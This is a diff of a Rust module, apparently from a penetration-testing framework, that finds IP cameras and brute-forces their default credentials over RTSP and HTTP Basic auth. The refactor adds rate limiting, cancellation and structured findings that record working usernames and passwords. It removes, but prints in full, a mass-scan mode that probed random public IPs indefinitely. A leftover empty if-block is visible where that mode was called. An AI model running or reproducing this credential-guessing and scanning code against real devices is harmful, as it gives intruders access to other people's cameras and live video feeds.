@@ -1,13 +1,13 @@
-use anyhow::Result;
+use anyhow::{Context, Result};
 use colored::*;
 use reqwest::Client;
 use std::collections::{HashMap, HashSet};
 use base64::prelude::*;
-use crate::utils::{generate_random_public_ip, is_subnet_target, parse_subnet, subnet_host_count, EXCLUDED_RANGES};
-use std::sync::atomic::{AtomicU64, Ordering};
+use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
+use crate::utils::{is_subnet_target, parse_subnet, subnet_host_count};
 
 use std::sync::Arc;
-use std::time::{Duration, Instant};
+use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::sync::{Mutex, Semaphore};
 use tokio::time::timeout;
@@ -163,16 +163,21 @@ const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
     ("", "123456"),
 ];
 
-pub async fn run(target: &str) -> Result<()> {
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("camxploit requires a single-host target")?;
     if crate::utils::get_global_source_port().await.is_some() {
         crate::mprintln!("{}", "[*] Note: source_port does not apply to HTTP connections.".dimmed());
     }
     let target = target.trim().to_string();
-    if !crate::utils::is_batch_mode() {
-        if !crate::utils::is_batch_mode() {
+    if !crate::utils::is_batch_mode()
+        && !crate::utils::is_batch_mode() {
             print_banner();
         }
-    }
+
+    let mut outcome = ModuleOutcome::ok();
 
     // Subnet handling — iterate over each IP in the CIDR
     if is_subnet_target(&target) {
@@ -180,25 +185,30 @@ pub async fn run(target: &str) -> Result<()> {
         let count = subnet_host_count(&network);
         crate::mprintln!("{}", format!("[*] Subnet {} — {} hosts to scan sequentially", target, count).cyan());
         for ip in network.iter() {
+            if ctx.is_cancelled() { break; }
             let ip_str = ip.to_string();
             crate::mprintln!("\n{}", format!("[*] >>> Scanning host: {}", ip_str).cyan().bold());
-            if let Err(e) = Box::pin(run(&ip_str)).await {
+            if let Err(e) = scan_host(ctx, &ip_str, &mut outcome).await {
                 crate::mprintln!("{}", format!("[!] Error on {}: {}", ip_str, e).yellow());
             }
         }
         crate::mprintln!("\n{}", "[*] Subnet scan complete.".green().bold());
-        return Ok(());
+        return Ok(outcome);
     }
 
-    if target == "0.0.0.0" || target == "0.0.0.0/0" {
-        return run_mass_scan().await;
-    }
+    if target == "0.0.0.0" || target == "0.0.0.0/0" {    }
 
+    scan_host(ctx, &target, &mut outcome).await?;
+    Ok(outcome)
+}
+
+async fn scan_host(ctx: &ModuleCtx, target: &str, outcome: &mut ModuleOutcome) -> Result<()> {
     crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
 
     // 1. Port Scan
     crate::mprintln!("{}", format!("\n[*] Scanning {} ports...", COMMON_PORTS.len()).yellow());
-    let (open_ports, rtsp_ports) = check_ports(&target).await;
+    ctx.rate_limit(target).await;
+    let (open_ports, rtsp_ports) = check_ports(target).await;
 
     if open_ports.is_empty() {
         crate::mprintln!("{}", "[-] No open camera ports found.".red());
@@ -206,25 +216,49 @@ pub async fn run(target: &str) -> Result<()> {
         return Ok(());
     }
 
+    for &port in &open_ports {
+        outcome.findings.push(Finding {
+            target: target.to_string(),
+            kind: FindingKind::OpenPort,
+            message: format!("Open port {}/tcp on {}", port, target),
+            data: Some(serde_json::json!({"port": port, "protocol": "tcp"})),
+        });
+    }
+
+    // Skip hosts whose only open ports are general-purpose services (SSH/Telnet/RDP);
+    // they are not cameras and waste fingerprinting work.
+    if is_only_ignored_services(&open_ports) {
+        crate::mprintln!(
+            "{}",
+            format!("[-] Only non-camera services open ({:?}); skipping.", open_ports).yellow()
+        );
+        return Ok(());
+    }
+
     crate::mprintln!("{}", format!("\n[+] Found {} open ports: {:?}", open_ports.len(), open_ports).green());
 
     // 2. Camera Detection & Fingerprinting
     let client = create_client()?;
-    let is_camera = check_if_camera(&target, &open_ports, &client).await;
-    
+    ctx.rate_limit(target).await;
+    let is_camera = check_if_camera(target, &open_ports, &client).await;
+
     if !is_camera {
         crate::mprintln!("{}", "\n[-] Target does not appear to be a camera based on initial checks.".yellow());
         crate::mprintln!("{}", "[*] Proceeding with additional checks...".cyan());
     }
 
-    check_login_pages(&target, &open_ports, &client).await;
-    fingerprint_camera(&target, &open_ports, &client).await;
- 
+    ctx.rate_limit(target).await;
+    check_login_pages(target, &open_ports, &client).await;
+    ctx.rate_limit(target).await;
+    fingerprint_camera(target, &open_ports, &client).await;
+
     // 3. Credential Testing
-    test_default_passwords(&target, &open_ports, &rtsp_ports, &client).await;
+    ctx.rate_limit(target).await;
+    test_default_passwords(ctx, target, &open_ports, &rtsp_ports, &client, outcome).await;
 
     // 4. Stream Detection
-    detect_live_streams(&target, &open_ports, &rtsp_ports, &client).await;
+    ctx.rate_limit(target).await;
+    detect_live_streams(target, &open_ports, &rtsp_ports, &client).await;
 
     // 5. Additional Information
 
@@ -355,14 +389,13 @@ async fn probe_rtsp(target: &str, port: u16) -> bool {
         if stream.write_all(request.as_bytes()).await.is_err() { return false; }
         
         let mut buffer = [0u8; 2048];
-        if let Ok(Ok(n)) = timeout(Duration::from_secs(PORT_SCAN_TIMEOUT), stream.read(&mut buffer)).await {
-            if n > 0 {
+        if let Ok(Ok(n)) = timeout(Duration::from_secs(PORT_SCAN_TIMEOUT), stream.read(&mut buffer)).await
+            && n > 0 {
                 let response = String::from_utf8_lossy(&buffer[..n]);
                 if response.contains("RTSP/1.0") || response.contains("Public:") || response.contains("Server:") {
                     return true;
                 }
             }
-        }
     }
     false
 }
@@ -436,8 +469,8 @@ async fn check_if_camera(target: &str, open_ports: &[u16], client: &Client) -> b
         let _ = task.await;
     }
 
-    let result = *found.lock().await;
-    result
+    
+    *found.lock().await
 }
 
 async fn check_login_pages(target: &str, open_ports: &[u16], client: &Client) {
@@ -515,14 +548,14 @@ async fn fingerprint_camera(target: &str, open_ports: &[u16], client: &Client) {
 // CREDENTIALS
 // =================================================================================
 
-async fn test_default_passwords(target: &str, open_ports: &[u16], rtsp_ports: &[u16], client: &Client) {
+async fn test_default_passwords(ctx: &ModuleCtx, target: &str, open_ports: &[u16], rtsp_ports: &[u16], client: &Client, outcome: &mut ModuleOutcome) {
     crate::mprintln!("{}", "\n[🔑] Testing common credentials...".cyan());
     crate::mprintln!("{}", "[ℹ️] Prioritizing RTSP ports and Web ports with authentication.".yellow());
 
     let all_creds_vec = get_default_credentials();
     let all_creds = all_creds_vec.as_slice();
     let mut priority_creds = Vec::new();
-    
+
     // Top priority credentials
     priority_creds.push(("admin", "admin"));
     priority_creds.push(("admin", "12345"));
@@ -531,12 +564,14 @@ async fn test_default_passwords(target: &str, open_ports: &[u16], rtsp_ports: &[
     priority_creds.push(("root", "root"));
     priority_creds.push(("root", "12345"));
     priority_creds.push(("", "admin"));
-    
+
     // Test RTSP ports first
     if !rtsp_ports.is_empty() {
         crate::mprintln!("{}", "\n[🎯] Testing RTSP Authentication...".cyan());
         for &port in rtsp_ports {
             for &(user, pass) in &priority_creds {
+                if ctx.is_cancelled() { return; }
+                ctx.rate_limit(target).await;
                 if test_rtsp_auth(target, port, user, pass).await {
                     crate::mprintln!("🔥 {} RTSP {}:{} @ rtsp://{}:{}/",
                         "SUCCESS!".bright_green().bold(),
@@ -550,31 +585,46 @@ async fn test_default_passwords(target: &str, open_ports: &[u16], rtsp_ports: &[
                         crate::cred_store::CredType::Password,
                         "creds/camxploit/camxploit",
                     ).await;
+                    outcome.findings.push(Finding {
+                        target: target.to_string(),
+                        kind: FindingKind::Credential,
+                        message: format!("RTSP credentials valid {}:{} on rtsp://{}:{}/", user, pass, target, port),
+                        data: Some(serde_json::json!({
+                            "service": "rtsp",
+                            "port": port,
+                            "username": user,
+                            "password": pass,
+                        })),
+                    });
                 }
             }
         }
     }
-    
+
     // Test HTTP/HTTPS ports
     crate::mprintln!("{}", "\n[🎯] Testing HTTP Basic Auth...".cyan());
     for &port in open_ports {
         if rtsp_ports.contains(&port) {
             continue; // Already tested
         }
-        
+        if ctx.is_cancelled() { return; }
+
         let protocol = get_protocol(port);
         let url = format!("{}://{}:{}", protocol, target, port);
-        
+
         // First check if auth is required
-        if let Ok(resp) = client.get(&url).send().await {
-            if resp.status() == reqwest::StatusCode::UNAUTHORIZED {
+        ctx.rate_limit(target).await;
+        if let Ok(resp) = client.get(&url).send().await
+            && resp.status() == reqwest::StatusCode::UNAUTHORIZED {
                 // Try credentials
                 // First try priority creds
                 let mut tested = HashSet::new();
                 for &(user, pass) in &priority_creds {
+                    if ctx.is_cancelled() { return; }
                     tested.insert((user, pass));
-                    if let Ok(resp) = client.get(&url).basic_auth(user, Some(pass)).send().await {
-                        if resp.status().is_success() {
+                    ctx.rate_limit(target).await;
+                    if let Ok(resp) = client.get(&url).basic_auth(user, Some(pass)).send().await
+                        && resp.status().is_success() {
                             crate::mprintln!("🔥 {} HTTP Basic {}:{} @ {}",
                                 "SUCCESS!".bright_green().bold(),
                                 user,
@@ -586,16 +636,29 @@ async fn test_default_passwords(target: &str, open_ports: &[u16], rtsp_ports: &[
                                 crate::cred_store::CredType::Password,
                                 "creds/camxploit/camxploit",
                             ).await;
+                            outcome.findings.push(Finding {
+                                target: target.to_string(),
+                                kind: FindingKind::Credential,
+                                message: format!("HTTP Basic credentials valid {}:{} @ {}", user, pass, url),
+                                data: Some(serde_json::json!({
+                                    "service": "http",
+                                    "port": port,
+                                    "username": user,
+                                    "password": pass,
+                                    "url": url,
+                                })),
+                            });
                         }
-                    }
                 }
 
                 // Then try remaining creds from the full list
                 for &(user, pass) in all_creds {
+                    if ctx.is_cancelled() { return; }
                     if tested.contains(&(user, pass)) { continue; }
 
-                    if let Ok(resp) = client.get(&url).basic_auth(user, Some(pass)).send().await {
-                        if resp.status().is_success() {
+                    ctx.rate_limit(target).await;
+                    if let Ok(resp) = client.get(&url).basic_auth(user, Some(pass)).send().await
+                        && resp.status().is_success() {
                              crate::mprintln!("🔥 {} HTTP Basic {}:{} @ {}",
                                 "SUCCESS!".bright_green().bold(),
                                 user,
@@ -607,11 +670,21 @@ async fn test_default_passwords(target: &str, open_ports: &[u16], rtsp_ports: &[
                                 crate::cred_store::CredType::Password,
                                 "creds/camxploit/camxploit",
                             ).await;
+                            outcome.findings.push(Finding {
+                                target: target.to_string(),
+                                kind: FindingKind::Credential,
+                                message: format!("HTTP Basic credentials valid {}:{} @ {}", user, pass, url),
+                                data: Some(serde_json::json!({
+                                    "service": "http",
+                                    "port": port,
+                                    "username": user,
+                                    "password": pass,
+                                    "url": url,
+                                })),
+                            });
                         }
-                    }
                 }
             }
-        }
     }
 }
 
@@ -723,19 +796,6 @@ fn get_default_credentials() -> Vec<(&'static str, &'static str)> {
     DEFAULT_CREDENTIALS.to_vec()
 }
 
-// =================================================================================
-// MASS SCAN FUNCTIONS
-// =================================================================================
-
-/// Build parsed exclusion list from EXCLUDED_RANGES
-fn build_exclusion_list() -> Vec<ipnetwork::IpNetwork> {
-    EXCLUDED_RANGES.iter()
-        .filter_map(|cidr| cidr.parse::<ipnetwork::IpNetwork>().ok())
-        .collect()
-}
-
-
-
 /// Check if all open ports are in the ignored services list (SSH/Telnet/RDP)
 /// Returns true if the host should be skipped (only non-camera services found)
 fn is_only_ignored_services(open_ports: &[u16]) -> bool {
@@ -743,148 +803,6 @@ fn is_only_ignored_services(open_ports: &[u16]) -> bool {
         return true;
     }
     open_ports.iter().all(|p| IGNORED_SERVICE_PORTS.contains(p))
-}
-
-async fn run_mass_scan() -> Result<()> {
-    crate::mprintln!("{}", "=== MASS SCAN MODE ACTIVATED ===".red().bold().blink());
-    crate::mprintln!("{}", "WARNING: This will scan random IP addresses indefinitely.".yellow());
-    crate::mprintln!("{}", "[*] Excluded ranges: bogons, private, reserved, documentation, public DNS".cyan());
-    crate::mprintln!("{}", "[*] Service filter: hosts with only SSH/Telnet/RDP will be skipped".cyan());
-    crate::mprintln!();
-
-    // Build exclusion list
-    let exclusions = build_exclusion_list();
-    crate::mprintln!("{}", format!("[+] Loaded {} IP exclusion ranges", exclusions.len()).green());
-
-    // Prompt for thread count
-    let thread_count = crate::utils::cfg_prompt_int_range("concurrency", "Threads", 200, 1, 5000).await? as usize;
-
-    // Prompt for output file
-    let output_file = crate::utils::cfg_prompt_output_file(
-        "output_file",
-        "Output file for discovered cameras",
-        "camxploit_results.txt",
-    ).await?;
-
-    crate::mprintln!("{}", format!(
-        "[*] Starting mass scan with {} threads... Press Ctrl+C to stop.",
-        thread_count
-    ).cyan());
-    crate::mprintln!();
-
-    let exclusions = Arc::new(exclusions);
-    let scanned_count = Arc::new(AtomicU64::new(0));
-    let found_count = Arc::new(AtomicU64::new(0));
-    let skipped_service_count = Arc::new(AtomicU64::new(0));
-    let semaphore = Arc::new(Semaphore::new(thread_count));
-    let output_file = Arc::new(output_file);
-
-    // Progress reporter task (time-based, every 10 seconds)
-    {
-        let scanned = scanned_count.clone();
-        let found = found_count.clone();
-        let skipped = skipped_service_count.clone();
-        let start_time = Instant::now();
-        tokio::spawn(async move {
-            loop {
-                tokio::time::sleep(Duration::from_secs(10)).await;
-                let total = scanned.load(Ordering::Relaxed);
-                let elapsed = start_time.elapsed().as_secs().max(1);
-                let rate = total / elapsed;
-                crate::mprintln!(
-                    "[*] Progress: {} scanned | {} cameras found | {} skipped (non-camera) | {} IPs/sec",
-                    total,
-                    found.load(Ordering::Relaxed),
-                    skipped.load(Ordering::Relaxed),
-                    rate
-                );
-            }
-        });
-    }
-
-    // Infinite parallel scan loop
-    loop {
-        let permit = semaphore.clone().acquire_owned().await
-            .map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
-        let exc = exclusions.clone();
-        let scanned = scanned_count.clone();
-        let found = found_count.clone();
-        let skipped = skipped_service_count.clone();
-        let outfile = output_file.clone();
-
-        tokio::spawn(async move {
-            let ip = generate_random_public_ip(&exc);
-            let target = ip.to_string();
-
-            // Parallel port scan
-            let (open_ports, rtsp_ports) = check_ports(&target).await;
-            scanned.fetch_add(1, Ordering::Relaxed);
-
-            if open_ports.is_empty() {
-                drop(permit);
-                return;
-            }
-
-            // Service filter: skip if only SSH/Telnet/RDP are open
-            if is_only_ignored_services(&open_ports) {
-                skipped.fetch_add(1, Ordering::Relaxed);
-                drop(permit);
-                return;
-            }
-
-            crate::mprintln!(
-                "{}",
-                format!(
-                    "\n[+] Target: {} - {} open ports (camera-relevant): {:?}",
-                    target,
-                    open_ports.len(),
-                    open_ports
-                )
-                .green()
-                .bold()
-            );
-
-            let client = match create_client() {
-                Ok(c) => c,
-                Err(e) => {
-                    crate::meprintln!("Failed to create client: {}", e);
-                    drop(permit);
-                    return;
-                }
-            };
-
-            // Camera detection & fingerprinting
-            let is_camera = check_if_camera(&target, &open_ports, &client).await;
-            check_login_pages(&target, &open_ports, &client).await;
-            fingerprint_camera(&target, &open_ports, &client).await;
-
-            // Credential testing
-            test_default_passwords(&target, &open_ports, &rtsp_ports, &client).await;
-
-            // Stream detection
-            detect_live_streams(&target, &open_ports, &rtsp_ports, &client).await;
-
-            // Record discovered camera
-            if is_camera || !rtsp_ports.is_empty() {
-                found.fetch_add(1, Ordering::Relaxed);
-                // Save to output file
-                if let Ok(mut file) = std::fs::OpenOptions::new()
-                    .create(true)
-                    .append(true)
-                    .open(outfile.as_str())
-                {
-                    use std::io::Write;
-                    let _ = writeln!(
-                        file,
-                        "CAMERA: {} | ports: {:?} | rtsp: {:?}",
-                        target, open_ports, rtsp_ports
-                    );
-                }
-            }
-
-            drop(permit);
-        });
-    }
 }
 
 pub fn info() -> crate::module_info::ModuleInfo {
@@ -897,3 +815,4 @@ pub fn info() -> crate::module_info::ModuleInfo {
         rank: crate::module_info::ModuleRank::Great,
     }
 }
+crate::register_native_module!(crate::module::Category::Creds, "camxploit/camxploit", native);
